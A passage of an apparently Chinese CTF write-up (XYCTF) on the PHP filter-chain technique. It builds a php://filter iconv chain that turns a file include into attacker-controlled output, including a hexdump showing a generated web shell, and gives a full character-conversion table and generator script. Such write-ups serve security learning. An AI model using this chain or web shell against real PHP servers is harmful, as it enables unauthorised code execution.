class="string">&#x27;W&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;D&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;7&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&gt;);</span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$filters</span> = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">&gt;<span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">&gt;<span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$base64_payload</span>)) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">&gt;<span class="variable">$filters</span> .= <span class="variable">$conversions</span>[<span class="variable">$c</span>] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;<span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$final_payload</span> = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">// echo $final_payload;</span></span><br><span class="line">&gt;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$final_payload</span>));</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">// hexdump</span></span><br><span class="line">&gt;<span class="comment">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &quot;&lt;?=`|</span></span><br><span class="line">&gt;<span class="comment">// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&gt;.&quot;.|</span></span><br></pre></td></tr></table></figure><p>但是这个脚本直接般到这道题是不行的 因为不够 而且有脏字符</p><p>这里需要注意的地方是：</p><ul><li><p><code>convert.iconv.UTF8.UTF7</code> 将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让 <code>convert.base64-decode</code> 过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。但是实际测试貌似我遇到的情况并没有抛出 Error ，最差情况抛出了 warning 但不是特别影响，但是为了避免奇怪的错误，还是加上为好。</p></li><li><p><code>data://,</code>后的数据是为了方便展示，需要补足一定的位数，当然如果使用 <code>include</code> 就不能用了，毕竟需要 RFI ，如果 RFI 选型能用，既然都是 RFI 了还整啥 LFI 呢2333</p></li></ul><p>让我们再回过头来看，虽然这个做法比较的新颖，但是其实深入理解之后会发现，这个攻击技巧需要我们提前把所有单字符的编码形式给 fuzz 出来，而且 fuzz 的结果还要有一定的技巧性，并不是所有出现了合法字符的编码形式就是符合要求的。</p><p>在跟 @wupco 老师讨论后，我们要找的字符编码形式要求为( 假设我们要找的字符为 x )：</p><ul><li><p>x 必须在最终生成的字符串的前端</p></li><li><p>字符串前端的字符当中，最好的情况是允许存在仅且唯一一个 x 对于 PHP Base64 来说合法的字符。当然这里可以允许存在其他合法字符，但是对于 fuzz 来说通用性并不强，当确实没办法找到单个字符的时候可以使用多个字符来代替。</p></li></ul><p>我们简单拿 8 这个字符的编码规则 (<code>convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2</code>) 举个例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="variable">$url</span> = <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> = <span class="variable">$url</span>.<span class="string">&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line">&gt;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">// hexdump</span></span><br><span class="line">&gt;<span class="comment">// 00000000  73 74 72 69 6e 67 28 32  30 29 20 22 1b 24 29 43  |string(20) &quot;.$)C|</span></span><br><span class="line">&gt;<span class="comment">// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|</span></span><br><span class="line">&gt;<span class="comment">// 00000020  22 0a                                             |&quot;.|</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$url</span> = <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> = <span class="variable">$url</span>.<span class="string">&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line">&gt;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">// hexdump</span></span><br><span class="line">&gt;<span class="comment">// 00000000  73 74 72 69 6e 67 28 33  34 29 20 22 ff fe 61 00  |string(34) &quot;..a.|</span></span><br><span class="line">&gt;<span class="comment">// 00000010  61 00 61 00 61 00 61 00  61 00 61 00 61 00 61 00  |a.a.a.a.a.a.a.a.|</span></span><br><span class="line">&gt;<span class="comment">// 00000020  61 00 61 00 61 00 61 00  61 00 61 00 61 00 22 0a  |a.a.a.a.a.a.a.&quot;.|</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$url</span> = <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> = <span class="variable">$url</span>.<span class="string">&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line">&gt;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">// hexdump</span></span><br><span class="line">&gt;<span class="comment">// 00000000  73 74 72 69 6e 67 28 36  38 29 20 22 38 01 fe 00  |string(68) &quot;8...|</span></span><br><span class="line">&gt;<span class="comment">// 00000010  61 00 00 00 61 00 00 00  61 00 00 00 61 00 00 00  |a...a...a...a...|</span></span><br><span class="line">&gt;<span class="comment">// *</span></span><br><span class="line">&gt;<span class="comment">// 00000050  22 0a                                             |&quot;.|</span></span><br></pre></td></tr></table></figure><p>可以看到我们通过编码规则逐步拓展了原字符串的字节长度，在原字符串的前端生成了我们想要构造的字符，所以对于我们需要的编码规则条件来说，还需要拓展原字节长度，这也算是第一个条件的原理。</p><p>我们可以基于以上去做一些简单的 fuzz ，整个 fuzz 原理并不复杂，最后检查通过 Filter 规则生成的结果是否满足以上条件即可。</p><p>虽然我们知道只要编码规则用得好，其实文件内容是什么无关紧要，但是如果实在是找不到可用文件怎么办？</p><p>这里需要用到一个小技巧：作者发现，<code>convert.iconv.UTF8.CSISO2022KR</code> 总是会在字符串前面生成 <code>\x1b$)C</code> ，所以我们可以利用这个来产生足够的垃圾数据供我们构造 Payload ，以下用一个空文件生成一个 8 来测试：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="variable">$url</span> = <span class="string">&quot;php://filter/&quot;</span>;</span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">// 8</span></span><br><span class="line">&gt;<span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$url</span> = <span class="variable">$url</span>.<span class="string">&quot;|convert.base64-decode|convert.base64-encode&quot;</span>;</span><br><span class="line"></span><br><span class="line">&gt;<span class="variable">$url</span> = <span class="variable">$url</span>.<span class="string">&quot;/resource=./e&quot;</span>;</span><br><span class="line">&gt;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">// hexdump</span></span><br><span class="line">&gt;<span class="comment">// 00000000  73 74 72 69 6e 67 28 31  36 29 20 22 38 47 79 51  |string(16) &quot;8GyQ|</span></span><br><span class="line">&gt;<span class="comment">// 00000010  70 51 77 2b 41 44 30 41  50 51 3d 3d 22 0a        |pQw+AD0APQ==&quot;.|</span></span><br></pre></td></tr></table></figure><p>这样我们可以使用垃圾数据作为基础数据进行编码转换了。</p></blockquote><p>由此 我们可以根据上面那个脚本改一下 写出我们的脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$base64_payload</span> = <span class="string">&quot;WFlDVEY8PDw8PDw8PA==&quot;</span>;<span class="comment">//XYCTF&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;</span></span><br><span class="line"><span class="comment">//$base64_payload = &quot;WFlDVEY=&quot;;</span></span><br><span class="line"><span class="variable">$conversions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>=&gt;<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>=&gt;<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>=&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>=&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$base64_payload</span>)) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="variable">$conversions</span>[<span class="variable">$c</span>] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;|string.strip_tags&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$final_payload</span> = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=data://,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filters</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123456</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$final_payload</span>));</span><br><span class="line"><span class="comment">//赋成XYCTF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">convert.base64-encode|convert.iconv.UTF8.UTF7||convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7||convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.<span class="number">8859_3</span>.UTF16|convert.iconv.<span class="number">863</span>.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-<span class="number">16</span>|convert.iconv.CSIBM1161.IBM-<span class="number">932</span>|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-<span class="number">16</span>|convert.iconv.CSIBM1161.IBM-<span 